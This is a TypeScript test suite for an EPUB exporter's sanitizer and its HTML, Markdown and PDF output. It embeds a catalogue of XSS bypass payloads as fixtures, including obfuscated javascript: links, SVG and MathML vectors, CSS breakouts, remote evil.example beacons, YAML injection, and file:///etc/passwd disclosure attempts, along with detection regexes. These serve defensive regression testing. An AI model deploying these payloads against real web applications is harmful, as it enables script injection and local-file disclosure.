import * as path from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import type { NormalizedPublication } from "@reflowpress/core";
import { loadEpub } from "@reflowpress/epub";
import {
  classifyUrl,
  exportToHtml,
  exportToMarkdown,
  exportToPdf,
  sanitizePublicationContent,
  sanitizeStylesheet,
  sanitizeXhtmlSection,
} from "@reflowpress/export";
import {
  buildPrintDocument,
  ChromiumPdfRenderer,
  CHROMIUM_NO_SANDBOX_ENV,
  isChromiumSandboxOptOut,
} from "@reflowpress/renderer";

// Chromium refuses to start sandboxed as root (as in this dev container and
// many CI containers). Opt out explicitly, and only in that situation.
const RUNNING_AS_ROOT = process.getuid?.() === 0;
if (RUNNING_AS_ROOT && process.env[CHROMIUM_NO_SANDBOX_ENV] === undefined) {
  process.env[CHROMIUM_NO_SANDBOX_ENV] = "1";
}

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const FIXTURES_DIR = path.resolve(__dirname, "../fixtures");

const XHTML = "http://www.w3.org/1999/xhtml";
const SVG = "http://www.w3.org/2000/svg";
const XLINK = "http://www.w3.org/1999/xlink";

/** Every bypass reported against the former regex sanitizer. */
const BYPASS_BODY = `
  <p id="p1">before<script>alert("script-space")</script >after</p>
  <img src="x.png" onerror = "alert('spaced-eq')" alt="spaced"/>
  <a href="&#106;avascript:alert('entity')">entity link</a>
  <a href="  JaVaScRiPt:alert('case')">case link</a>
  <a href="java&#x09;script:alert('tab')">tab link</a>
  <a href="vbscript:msgbox(1)">vb link</a>
  <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data link</a>
  <a href="//evil.example/x">network path</a>
  <svg xmlns="${SVG}" xmlns:xlink="${XLINK}" width="10" height="10">
    <a xlink:href="javascript:alert('xlink')"><text>svg link</text></a>
    <animate attributeName="href" to="javascript:alert('animate')"/>
    <set attributeName="href" to="javascript:alert('set')"/>
    <foreignObject><img src="x" onerror="alert('fo')"/></foreignObject>
    <image href="https://evil.example/tracker.png"/>
    <use href="https://evil.example/sprite.svg#a"/>
    <rect fill="url(https://evil.example/#f)" width="1" height="1"/>
  </svg>
  <iframe srcdoc="&lt;script&gt;alert('srcdoc')&lt;/script&gt;"/>
  <object data="javascript:alert('object')"/>
  <embed src="https://evil.example/x.swf"/>
  <meta http-equiv="refresh" content="0;url=https://evil.example/"/>
  <base href="https://evil.example/"/>
  <form action="https://evil.example/collect"><input name="q" formaction="javascript:alert(1)"/><button formaction="https://evil.example/">go</button>form text</form>
  <p style="background:url(https://evil.example/bg.png)">styled remote</p>
  <p style="width:expression(alert('expr'))">styled expression</p>
  <p style="color: red">styled ok</p>
  <img src="https://evil.example/remote.png" alt="remote image"/>
  <video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"><source src="https://evil.example/v.webm"/></video>
  <audio src="http://evil.example/a.mp3"/>
  <link rel="stylesheet" href="https://evil.example/x.css"/>
  <noscript><img src="x" onerror="alert('noscript')"/></noscript>
  <template><img src="x" onerror="alert('template')"/></template>
  <math xmlns="http://www.w3.org/1998/Math/MathML"><mi>x</mi><annotation-xml encoding="text/html"><img src="x" onerror="alert('mathml')"/></annotation-xml></math>
  <p>&lt;img src=x onerror=alert('text')&gt; stays text</p>
`;

function section(
  body: string,
  id = "sec1",
  href = "text/ch1.xhtml",
): NormalizedPublication["readingOrder"][number] {
  return {
    id,
    href,
    mediaType: "application/xhtml+xml",
    markup: `<html xmlns="${XHTML}"><head><title>t</title></head><body>${body}</body></html>`,
  };
}

function publication(
  overrides: Partial<NormalizedPublication> = {},
): NormalizedPublication {
  return {
    version: "3.0",
    metadata: { title: "Hostile Book", language: "en" },
    readingOrder: [section(BYPASS_BODY)],
    resources: [],
    ...overrides,
  };
}

const DANGEROUS_ELEMENTS =
  /<(script|iframe|frame|frameset|object|embed|applet|form|input|button|base|link|animate|set|animateMotion|animateTransform|foreignObject|noscript|template|annotation-xml)\b/i;
const URL_ATTRIBUTES = new Set([
  "href",
  "xlink:href",
  "src",
  "poster",
  "srcset",
  "action",
  "formaction",
  "data",
  "background",
  "cite",
  "longdesc",
]);

function decodeEntities(value: string): string {
  return value
    .replace(/&#x([0-9a-f]+);?/gi, (_, hex) =>
      String.fromCodePoint(parseInt(hex, 16)),
    )
    .replace(/&#(\d+);?/g, (_, dec) => String.fromCodePoint(parseInt(dec, 10)))
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&amp;/g, "&");
}

/**
 * Lists executable / network vectors in serialized HTML. Exported markup quotes
 * every attribute with `"` and escapes `<`, `>` and `"` inside values, so this
 * tag/attribute scan sees what a browser tokenizer sees.
 */
function findExecutableVectors(html: string): string[] {
  const problems: string[] = [];
  const elementMatch = DANGEROUS_ELEMENTS.exec(html);
  if (elementMatch) problems.push(`element <${elementMatch[1]}>`);

  for (const tag of html.match(/<[a-zA-Z][^>]*>/g) ?? []) {
    for (const attr of tag.matchAll(/\s([^\s="'>/]+)\s*=\s*"([^"]*)"/g)) {
      const name = attr[1]!.toLowerCase();
      const value = decodeEntities(attr[2]!)
        // eslint-disable-next-line no-control-regex
        .replace(/[\s\u0000-\u001f]+/g, "")
        .toLowerCase();
      if (name.startsWith("on")) problems.push(`event handler ${name}`);
      if (name === "srcdoc") problems.push("srcdoc");
      if (name === "http-equiv" && value === "refresh") {
        problems.push("meta refresh");
      }
      if (
        URL_ATTRIBUTES.has(name) &&
        /^(javascript|vbscript|livescript|data:text|data:application|https?):|^[\\/]{2}/.test(
          value,
        )
      ) {
        problems.push(`${name}=${value.slice(0, 40)}`);
      }
      if (
        name === "style" &&
        /expression\(|url\((?!["']?(data:image|#))/.test(value)
      ) {
        problems.push(`style=${value.slice(0, 40)}`);
      }
    }
  }
  return problems;
}

describe("Shared DOM sanitizer", () => {
  it("removes every reported regex-sanitizer bypass from section markup", () => {
    const html = sanitizeXhtmlSection(section(BYPASS_BODY).markup);

    expect(findExecutableVectors(html)).toEqual([]);
    expect(html).not.toMatch(/https?:\/\//);
    expect(html).not.toContain("evil.example");
    // Benign content survives
    expect(html).toContain("before");
    expect(html).toContain("after");
    expect(html).toContain("form text");
    expect(html).toContain('<p style="color: red">styled ok</p>');
    expect(html).toContain("<text>svg link</text>");
    expect(html).toContain("<math><mi>x</mi></math>");
    // Escaped text stays text
    expect(html).toContain(
      "&lt;img src=x onerror=alert('text')&gt; stays text",
    );
  });

  it("classifies URLs after entity decoding, whitespace removal and lowercasing", () => {
    expect(classifyUrl("&#106;avascript:alert(1)")).toBe("other-scheme");
    expect(classifyUrl(" JAVA\tSCRIPT:alert(1)")).toBe("other-scheme");
    expect(classifyUrl("java&Tab;script:alert(1)")).toBe("other-scheme");
    expect(classifyUrl("\\\\evil.example\\x")).toBe("network-path");
    expect(classifyUrl("//evil.example/x")).toBe("network-path");
    expect(classifyUrl("data:text/html,<script>")).toBe("data");
    expect(classifyUrl("data:image/png;base64,AAAA")).toBe("data-image");
    expect(classifyUrl("#note-1")).toBe("fragment");
    expect(classifyUrl("../images/cover.png")).toBe("relative");
    expect(classifyUrl("HTTPS://example.com")).toBe("http");
  });

  it("falls back to escaped text for unparsable markup", () => {
    const warnings: string[] = [];
    const html = sanitizeXhtmlSection(
      `<p>open <embed src="x"><script>alert(1)</p>`,
      { onWarning: (w) => warnings.push(w) },
    );
    expect(html).not.toMatch(/<(embed|script)/i);
    expect(html).toContain("open");
    expect(warnings.some((w) => w.includes("plain text"))).toBe(true);
  });

  it("neutralizes </style> breakouts and remote @import/url() in stylesheets", () => {
    const result = sanitizeStylesheet(
      `@import url("https://evil.example/a.css");
       p { background: url(https://evil.example/bg.png) no-repeat; color: red }
       .ok { background: url("../images/bg.png") }
       p::after { content: "</STYLE ><script>alert(1)</script>" }`,
    );
    expect(result.dropped).toBe(false);
    expect(result.css).not.toMatch(/<\/style/i);
    expect(result.css).not.toContain("<");
    expect(result.css).not.toContain("@import");
    expect(result.css).not.toContain("evil.example");
    expect(result.css).toContain("color: red");
    expect(result.css).toContain('url("../images/bg.png")');
  });

  it("drops stylesheets whose unsafe constructs are hidden behind CSS escapes", () => {
    expect(
      sanitizeStylesheet(`@\\69mport "https://e.example/a.css";`).dropped,
    ).toBe(true);
    expect(
      sanitizeStylesheet(`p{background:u\\72l(https://e.example/x)}`).dropped,
    ).toBe(true);
    expect(sanitizeStylesheet(`p{width:expression(alert(1))}`).dropped).toBe(
      true,
    );
  });

  it("is linear on pathological markup (no ReDoS)", () => {
    const inputs = [
      `<p>${"<script".repeat(40000)}</p>`,
      `<p>${"<!--".repeat(40000)}</p>`,
      "<".repeat(200000),
      `<html xmlns="${XHTML}"><body>${"<div>".repeat(5000)}x${"</div>".repeat(5000)}</body></html>`,
    ];
    for (const input of inputs) {
      const started = performance.now();
      sanitizeXhtmlSection(input);
      expect(performance.now() - started).toBeLessThan(2000);
    }
    const started = performance.now();
    sanitizeStylesheet(
      `${"url(".repeat(50000)}${"/*".repeat(50000)}${'"'.repeat(50000)}`,
    );
    expect(performance.now() - started).toBeLessThan(2000);
  });
});

describe("HTML exporter hardening", () => {
  it("exports hostile markup without executable vectors or network URLs", () => {
    const { html } = exportToHtml(publication());

    expect(findExecutableVectors(html)).toEqual([]);
    expect(html).not.toMatch(/https?:\/\//);
    expect(html).not.toContain("evil.example");
  });

  it("carries a strict Content-Security-Policy", () => {
    const { html } = exportToHtml(publication());
    expect(html).toContain(
      `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:; media-src data:;`,
    );
    // CSP must precede any content-bearing element
    expect(html.indexOf("Content-Security-Policy")).toBeLessThan(
      html.indexOf("<style"),
    );
  });

  it("escapes manifest ids, metadata and rejects malformed media types", () => {
    const { html, warnings } = exportToHtml(
      publication({
        metadata: {
          title: "</title><script>alert('title')</script>",
          language: `ja"><script>alert('lang')</script>`,
          creator: `"><img src=x onerror=alert('creator')>`,
        },
        readingOrder: [
          {
            ...section(`<img src="../images/a.png" alt="a"/>`),
            id: `x"><img src=x onerror=alert('id')>`,
          },
        ],
        resources: [
          {
            href: "images/a.png",
            mediaType: `image/png;base64,AAAA" onerror="alert('mt')`,
            bytes: new Uint8Array([1, 2, 3]),
          },
        ],
      }),
    );

    expect(findExecutableVectors(html)).toEqual([]);
    expect(html).toContain(
      `id="section-0-x&quot;&gt;&lt;img src=x onerror=alert(&#39;id&#39;)&gt;"`,
    );
    expect(html).toContain(
      `<html lang="ja&quot;&gt;&lt;script&gt;alert(&#39;lang&#39;)&lt;/script&gt;"`,
    );
    expect(html).not.toContain("<script>alert('title')");
    expect(html).not.toContain("data:image/png;base64,AAAA");
    expect(warnings.some((w) => w.includes("media type"))).toBe(true);
  });

  it("cannot break out of <style> via embedded EPUB CSS and drops remote imports", () => {
    const { html } = exportToHtml(
      publication({
        readingOrder: [section("<p>styled</p>")],
        resources: [
          {
            href: "style.css",
            mediaType: "text/css",
            bytes: new TextEncoder().encode(
              `@import url(https://evil.example/x.css);
               body { background: url(https://evil.example/t.png) }
               p { color: navy }
               </style><script>alert('css')</script><style>`,
            ),
          },
        ],
      }),
    );

    expect(html.match(/<\/style/gi)).toHaveLength(1);
    expect(html).not.toMatch(/<script/i);
    expect(html).not.toContain("evil.example");
    expect(html).toContain("p { color: navy }");
  });

  it("caps inlined bytes per occurrence so one large image cannot be multiplied", () => {
    const bytes = new Uint8Array(1000).fill(7);
    const { html, warnings } = exportToHtml(
      publication({
        readingOrder: [
          section(
            Array.from(
              { length: 5 },
              () => `<img src="../img/big.png" alt=""/>`,
            ).join(""),
          ),
        ],
        resources: [{ href: "img/big.png", mediaType: "image/png", bytes }],
      }),
      { maxInlineAssetBytes: 2500 },
    );

    expect(html.match(/src="data:image\/png;base64,/g)).toHaveLength(2);
    expect(warnings.some((w) => w.includes("omitted from inlining"))).toBe(
      true,
    );
  });

  it("keeps images, ruby and typography of the bundled fixtures intact", async () => {
    const japanese = await loadEpub(
      path.join(FIXTURES_DIR, "sample-japanese.epub"),
    );
    const { html } = exportToHtml(japanese, { writingMode: "vertical-rl" });
    expect(html).toContain("<ruby>吾輩<rt>わがはい</rt></ruby>");
    expect(html).toContain("writing-mode: vertical-rl");
    expect(html).toContain('<span class="tcy">38</span>');
    expect(findExecutableVectors(html)).toEqual([]);

    const sample = await loadEpub(path.join(FIXTURES_DIR, "sample.epub"));
    const sampleHtml = exportToHtml(sample).html;
    expect(sampleHtml).toContain("reflowpress-section");
    expect(findExecutableVectors(sampleHtml)).toEqual([]);

    const withImage = exportToHtml(
      publication({
        readingOrder: [
          section(
            `<figure><img src="../images/cover.png" alt="cover"/><figcaption>c</figcaption></figure>
             <svg xmlns="${SVG}" xmlns:xlink="${XLINK}" viewBox="0 0 10 10"><image xlink:href="../images/cover.png" width="10" height="10"/></svg>`,
          ),
        ],
        resources: [
          {
            href: "images/cover.png",
            mediaType: "image/png",
            bytes: new Uint8Array([137, 80, 78, 71]),
          },
        ],
      }),
    ).html;
    expect(withImage).toContain(
      '<img src="data:image/png;base64,iVBORw==" alt="cover">',
    );
    expect(withImage).toContain(
      '<image xlink:href="data:image/png;base64,iVBORw=="',
    );
    expect(withImage).toContain('viewBox="0 0 10 10"');
  });

  it("parses to a DOM without executable vectors in a real HTML parser (Chromium)", async () => {
    const { chromium } = await import("@playwright/test");
    const { html } = exportToHtml(publication());
    const browser = await chromium.launch();
    try {
      const page = await browser.newPage();
      const findings = await page.evaluate((markup) => {
        const doc = new DOMParser().parseFromString(markup, "text/html");
        const out: string[] = [];
        for (const el of Array.from(doc.querySelectorAll("*"))) {
          const name = el.localName.toLowerCase();
          if (
            /^(script|iframe|frame|object|embed|applet|form|input|button|base|link|animate|set|foreignobject|noscript|template)$/.test(
              name,
            )
          ) {
            out.push(`element ${name}`);
          }
          if (name === "meta" && el.getAttribute("http-equiv") === "refresh") {
            out.push("meta refresh");
          }
          for (const attr of Array.from(el.attributes)) {
            const value = attr.value.replace(/\s+/g, "").toLowerCase();
            if (attr.name.toLowerCase().startsWith("on"))
              out.push(`attr ${attr.name}`);
            if (
              /(^|:)(href|src|poster|action|formaction|data|srcdoc)$/.test(
                attr.name,
              ) &&
              /^(javascript|vbscript|data:text|https?):|^\/\//.test(value)
            ) {
              out.push(`${attr.name}=${value}`);
            }
          }
        }
        return out;
      }, html);
      expect(findings).toEqual([]);
    } finally {
      await browser.close();
    }
  }, 60000);
});

describe("Markdown exporter hardening", () => {
  function mdOf(body: string, overrides: Partial<NormalizedPublication> = {}) {
    return exportToMarkdown(
      publication({ readingOrder: [section(body)], ...overrides }),
      { assetDirectoryName: "book_assets" },
    );
  }

  it("escapes decoded text so entity-encoded tags never become live HTML", () => {
    const { markdown } = mdOf(
      `<p>&lt;img src=x onerror=alert(1)&gt; &amp;lt;b&amp;gt; [x](javascript:alert(1))</p>`,
    );
    expect(markdown).not.toMatch(/<img/i);
    expect(markdown).toContain("&lt;img src=x onerror=alert(1)&gt;");
    expect(markdown).toContain("&amp;lt;b&amp;gt;");
    // Brackets are escaped, so no Markdown link can form from text
    expect(markdown).toContain("\\[x\\](javascript:alert(1))");
  });

  it("allowlists link schemes after normalization and encodes destinations", () => {
    const { markdown } = mdOf(`
      <p><a href="JavaScript:alert(1)">a</a> <a href=" java&#x09;script:alert(2)">b</a>
      <a href="vbscript:x">c</a> <a href="data:text/html,x">d</a>
      <a href="https://example.com/?a=1&amp;b=2">e</a> <a href="#n1">f</a>
      <a href="ch2.xhtml">g</a> <a href="mailto:a@example.com">h</a>
      <a href="x) &lt;img src=x onerror=alert(1)&gt; (y">i</a></p>`);
    expect(markdown).not.toMatch(/\]\(\s*(javascript|vbscript|data):/i);
    expect(markdown).toContain("[e](https://example.com/?a=1&amp;b=2)");
    expect(markdown).toContain("[f](#n1)");
    expect(markdown).toContain("[g](ch2.xhtml)");
    expect(markdown).toContain("[h](mailto:a@example.com)");
    expect(markdown).toContain(
      "[i](x%29%20%3Cimg%20src=x%20onerror=alert%281%29%3E%20%28y)",
    );
    expect(markdown).not.toMatch(/<img/i);
  });

  it("drops non-local images and only writes safe image assets", () => {
    const { markdown, assets, warnings } = mdOf(
      `<img src="https://evil.example/t.png" alt="remote"/>
       <img src="data:image/png;base64,AAAA" alt="inline"/>
       <img src="../images/ok.png" alt="ok"/>
       <img src="../images/evil.html" alt="html"/>
       <img src="../images/payload.html" alt="disguised"/>
       <img src="../images/v.svg" alt="vector"/>`,
      {
        resources: [
          {
            href: "images/ok.png",
            mediaType: "image/png",
            bytes: new Uint8Array([1]),
          },
          {
            href: "images/evil.html",
            mediaType: "text/html",
            bytes: new TextEncoder().encode("<script>alert(1)</script>"),
          },
          {
            href: "images/payload.html",
            mediaType: "image/png",
            bytes: new Uint8Array([2]),
          },
          {
            href: "images/v.svg",
            mediaType: "image/svg+xml",
            bytes: new TextEncoder().encode(
              `<svg xmlns="${SVG}" onload="alert(1)"><script>alert(2)</script><rect width="1" height="1"/></svg>`,
            ),
          },
        ],
      },
    );

    expect(markdown).not.toContain("evil.example");
    expect(markdown).not.toContain("data:image");
    expect(markdown).toContain("![ok](book_assets/ok.png)");
    expect(markdown).toContain("![disguised](book_assets/payload.html.png)");
    expect(markdown).toContain("![vector](book_assets/v.svg)");
    expect([...assets.keys()].sort()).toEqual([
      "ok.png",
      "payload.html.png",
      "v.svg",
    ]);
    const svg = new TextDecoder().decode(assets.get("v.svg"));
    expect(svg).toContain('<svg xmlns="http://www.w3.org/2000/svg"');
    expect(svg).toContain("<rect");
    expect(svg).not.toMatch(/onload|<script/i);
    expect(warnings.some((w) => w.includes("omitted"))).toBe(true);
  });

  it("keeps MathML but passes it through the shared sanitizer", () => {
    const { markdown } = mdOf(
      `<math xmlns="http://www.w3.org/1998/Math/MathML"><mi href="javascript:alert(1)">x</mi><mtext>[a](javascript:alert(1))</mtext><annotation-xml encoding="text/html"><img src="x" onerror="alert(1)"/></annotation-xml></math>`,
    );
    expect(markdown).toContain("<math><mi>x</mi><mtext>");
    expect(markdown).not.toMatch(/onerror|href=|<img/i);
    expect(markdown).not.toContain("[a](javascript");
  });

  it("emits YAML frontmatter with properly escaped scalars", () => {
    const title = `T"\nhacked: true\\`;
    const language = `ja"\ninjected: yes`;
    const author = `A\u2028B`;
    const { markdown } = mdOf("<p>x</p>", {
      metadata: { title, language, creator: author },
    });
    const frontmatter = markdown.split("---")[1]!;
    const lines = frontmatter.trim().split("\n");
    expect(lines).toHaveLength(4);
    expect(lines.some((line) => /^(hacked|injected):/.test(line))).toBe(false);
    const value = (key: string) =>
      JSON.parse(
        lines.find((l) => l.startsWith(`${key}: `))!.slice(key.length + 2),
      );
    expect(value("title")).toBe(title);
    expect(value("language")).toBe(language);
    expect(value("author")).toBe(author);
  });

  it("cannot escape code spans or fenced blocks", () => {
    const { markdown } = mdOf(
      `<p><code>a\` &lt;img src=x onerror=alert(1)&gt; \`b</code></p>
       <ul><li>item<pre>line
\`\`\`
&lt;img src=x onerror=alert(2)&gt;
</pre></li></ul>`,
    );
    expect(markdown).toContain("``a` <img src=x onerror=alert(1)> `b``");
    // fence longer than any backtick run, continuation lines indented in the list item
    expect(markdown).toContain(
      "  ````\n  line\n  ```\n  <img src=x onerror=alert(2)>\n  ````",
    );
  });
});

describe("PDF renderer hardening", () => {
  it("refuses to render untrusted content without a sanitizer", async () => {
    await expect(
      new ChromiumPdfRenderer().render(publication()),
    ).rejects.toThrow(/sanitizeContent/);
  });

  it("escapes lang, title and section ids and neutralizes CSS in the print document", () => {
    const pub = publication({
      metadata: {
        title: "</title><script>alert(1)</script>",
        language: `ja" onload="alert(1)`,
      },
      readingOrder: [
        { ...section("<p>body</p>"), id: `s"><script>alert(1)</script>` },
      ],
      resources: [
        {
          href: "s.css",
          mediaType: "text/css",
          bytes: new TextEncoder().encode(
            "p{color:red}</style><script>alert(1)</script>",
          ),
        },
      ],
    });
    const { html } = buildPrintDocument(pub, sanitizePublicationContent(pub), {
      margin: "10mm</style><script>alert(1)</script>",
    });

    expect(html).toContain(`<html lang="ja&quot; onload=&quot;alert(1)"`);
    expect(html).toContain(
      `id="section-0-s&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;"`,
    );
    expect(html).not.toMatch(/<script/i);
    expect(html.match(/<\/style/gi)).toHaveLength(1);
    expect(html).toContain('http-equiv="Content-Security-Policy"');
  });

  it("parses the sandbox opt-out strictly", () => {
    expect(isChromiumSandboxOptOut({})).toBe(false);
    expect(isChromiumSandboxOptOut({ [CHROMIUM_NO_SANDBOX_ENV]: "0" })).toBe(
      false,
    );
    expect(isChromiumSandboxOptOut({ [CHROMIUM_NO_SANDBOX_ENV]: "" })).toBe(
      false,
    );
    expect(isChromiumSandboxOptOut({ [CHROMIUM_NO_SANDBOX_ENV]: "1" })).toBe(
      true,
    );
    expect(isChromiumSandboxOptOut({ [CHROMIUM_NO_SANDBOX_ENV]: "true" })).toBe(
      true,
    );
  });

  it.runIf(RUNNING_AS_ROOT)(
    "fails loudly instead of silently dropping the sandbox when it is unavailable",
    async () => {
      const renderer = new ChromiumPdfRenderer({
        sanitizeContent: sanitizePublicationContent,
        env: {},
      });
      await expect(renderer.render(publication())).rejects.toThrow(
        `${CHROMIUM_NO_SANDBOX_ENV}=1`,
      );
    },
    60000,
  );

  it("renders hostile content offline without disclosing local files", async () => {
    const result = await exportToPdf(
      publication({
        readingOrder: [
          section(
            `<meta http-equiv="refresh" content="0;url=file:///etc/passwd"/>
             <iframe src="file:///etc/passwd"/>
             <img src="https://evil.example/t.png" alt="t"/>
             <p>Visible body text</p>`,
          ),
        ],
      }),
      { format: "pdf", pageSize: "A4", writingMode: "horizontal-tb" },
    );

    expect(Buffer.from(result.bytes.slice(0, 5)).toString("ascii")).toBe(
      "%PDF-",
    );
    expect(Buffer.from(result.bytes).toString("latin1")).not.toContain(
      "root:x:0:0",
    );
    if (isChromiumSandboxOptOut()) {
      expect(
        result.warnings.some((w) => w.includes(CHROMIUM_NO_SANDBOX_ENV)),
      ).toBe(true);
    }
  }, 60000);
});
